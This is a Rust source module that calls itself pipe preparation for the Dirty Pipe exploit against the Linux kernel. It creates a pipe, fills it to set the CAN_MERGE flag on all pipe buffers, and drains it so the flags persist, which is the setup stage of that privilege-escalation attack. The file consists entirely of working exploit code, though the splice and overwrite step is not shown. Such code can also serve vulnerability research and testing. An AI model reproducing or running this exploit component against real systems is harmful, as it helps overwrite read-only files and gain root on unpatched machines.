//! Pipe preparation for Dirty Pipe exploit

use std::os::fd::{AsRawFd, FromRawFd, OwnedFd, RawFd};
use log::debug;

pub const PIPE_BUF_SIZE: usize = 65536;

pub struct PreparedPipe {
    pub read_fd: OwnedFd,
    pub write_fd: OwnedFd,
}

impl PreparedPipe {
    pub fn new() -> Result<Self, String> {
        let mut fds: [RawFd; 2] = [-1, -1];
        if unsafe { libc::pipe(fds.as_mut_ptr()) } < 0 {
            return Err(format!("pipe(): {}", std::io::Error::last_os_error()));
        }

        let read_fd = unsafe { OwnedFd::from_raw_fd(fds[0]) };
        let write_fd = unsafe { OwnedFd::from_raw_fd(fds[1]) };

        let mut pipe = Self { read_fd, write_fd };
        pipe.prepare()?;
        Ok(pipe)
    }

    fn prepare(&mut self) -> Result<(), String> {
        let size = unsafe { libc::fcntl(self.write_fd.as_raw_fd(), libc::F_GETPIPE_SZ) };
        let size = if size > 0 { size as usize } else { PIPE_BUF_SIZE };

        // Fill pipe to set CAN_MERGE on all buffers
        let dummy = vec![0x41u8; size];
        let written = self.write_all(&dummy)?;
        if written != size {
            return Err(format!("Pipe fill incomplete: {}/{}", written, size));
        }

        // Drain - flags remain!
        let mut drain = vec![0u8; size];
        let drained = self.read_all(&mut drain)?;
        if drained != size {
            return Err(format!("Pipe drain incomplete: {}/{}", drained, size));
        }

        debug!("[Pipe] Prepared {} bytes, CAN_MERGE set", size);
        Ok(())
    }

    fn write_all(&self, data: &[u8]) -> Result<usize, String> {
        let mut total = 0;
        while total < data.len() {
            let ret = unsafe {
                libc::write(self.write_fd.as_raw_fd(), 
                    data[total..].as_ptr() as *const _, data.len() - total)
            };
            if ret < 0 {
                return Err(format!("write(): {}", std::io::Error::last_os_error()));
            }
            if ret == 0 { break; } // EOF
            total += ret as usize;
        }
        Ok(total)
    }

    fn read_all(&self, buf: &mut [u8]) -> Result<usize, String> {
        let mut total = 0;
        while total < buf.len() {
            let ret = unsafe {
                libc::read(self.read_fd.as_raw_fd(),
                    buf[total..].as_mut_ptr() as *mut _, buf.len() - total)
            };
            if ret < 0 {
                return Err(format!("read(): {}", std::io::Error::last_os_error()));
            }
            if ret == 0 { break; } // EOF
            total += ret as usize;
        }
        Ok(total)
    }

    pub fn write_end(&self) -> RawFd { self.write_fd.as_raw_fd() }
}
